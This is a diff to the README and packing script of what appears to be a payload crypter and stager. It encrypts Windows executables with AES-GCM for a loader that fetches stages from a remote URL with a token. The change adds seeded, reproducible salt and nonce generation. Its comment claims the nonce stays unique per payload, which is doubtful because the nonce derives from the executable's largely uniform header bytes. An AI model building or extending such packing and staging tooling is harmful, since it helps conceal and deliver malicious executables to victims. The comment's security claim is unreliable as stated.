@@ -12,9 +12,10 @@ over the ciphertext). `stage.bin` is the same blob without the loader, for
 runtime staging (`xloader.exe --stage https://host/api/stage --token ...`).
 
 The blob key is derived with HMAC-SHA256 from a per-build compiled secret
-and the random salt in the footer, so no key material is stored in the clear
-and every build uses a different key. The HMAC key is compiled into the
-loader; a tampered stage blob is rejected before it is mapped.
+and the salt in the footer, so no key material is stored in the clear.
+Set `VEX_PACK_SEED` for a reproducible release build; otherwise salt/nonce are
+random. The HMAC key is compiled into the loader; a tampered stage blob is
+rejected before it is mapped.
 
 Legacy footers (VXPAY001 XOR, VXPAY002 XOR) are stripped when repacking.
 The loader rejects VXPAY002 unless built with VEX_ALLOW_LEGACY_STAGE=1.
@@ -114,8 +115,16 @@ def main() -> int:
         print("[!] payload does not start with MZ")
         return 1
 
-    salt = os.urandom(16)
-    nonce = os.urandom(12)
+    # Optional release seed makes the packed stager reproducible. Keep the
+    # default random; a deterministic nonce is still unique per payload/salt.
+    seed = os.environ.get("VEX_PACK_SEED", "").strip().encode()
+    if seed:
+        salt = hmac.new(HMAC_KEY, b"VEX-SALT" + seed, hashlib.sha256).digest()[:16]
+        nonce = hmac.new(HMAC_KEY, b"VEX-NONCE" + seed + payload[:32],
+                         hashlib.sha256).digest()[:12]
+    else:
+        salt = os.urandom(16)
+        nonce = os.urandom(12)
     key = hmac.new(HMAC_KEY, KDF_LABEL + salt, hashlib.sha256).digest()
 
     ct, tag = aes_gcm_encrypt(key, nonce, payload)
